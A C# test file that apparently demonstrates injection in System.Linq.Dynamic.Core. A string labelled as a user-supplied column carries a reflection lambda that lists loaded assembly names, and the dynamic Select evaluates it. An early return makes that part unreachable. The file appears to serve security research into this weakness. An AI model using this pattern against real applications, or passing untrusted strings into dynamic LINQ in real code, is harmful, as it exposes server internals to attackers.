﻿using System;
using System.Collections.Generic;
using System.Linq;
using System.Linq.Dynamic.Core;
using System.Linq.Dynamic.Core.CustomTypeProviders;
using System.Text.Json.Nodes;
using CsvHelper.Configuration.Attributes;
using Microsoft.AspNetCore.Authorization;
using Newtonsoft.Json;
using OfficeOpenXml.Attributes;

namespace ConsoleApp_net6._0;

internal class TestClass
{
    public void TestIt()
    {
        var exploits = new List<Customer>()
        {
            new Customer()
            {
                Id = 1,
                Name = "Mariusz"
            }
        };

        var results = exploits.Select(c => string.Join("\r\n",
            c.GetType().Assembly.ExportedTypes
                .SelectMany(type => type.CustomAttributes)
                .Select(attr => attr.AttributeType.Assembly)
                .Select(assembly => assembly.FullName))
        );
        foreach (var result in results)
        {
            Console.WriteLine(result);
        }

        return;

        string userSuppliedColumn = @"
    c => string.Join(""\r\n"",
            c.GetType().Assembly.ExportedTypes
                .SelectMany(type => type.CustomAttributes)
                .Select(attr => attr.AttributeType.Assembly)
                .Select(assembly => assembly.FullName))
    ";

        foreach (var e in exploits.AsQueryable().Select(userSuppliedColumn))
        {
            Console.WriteLine(e);
        }
    }

    [Authorize]
    [JsonObject]
    [EpplusTable]
    [Delimiter(";")]
    public class Customer
    {
        public int Id { get; set; }
        public string Name { get; set; }
    }

    [Authorize]
    [JsonObject]
    [EpplusTable]
    [Delimiter(";")]
    public class SomethOtherType1
    {
    }

    [DynamicLinqType]
    public class SomethOtherType2
    {
    }
}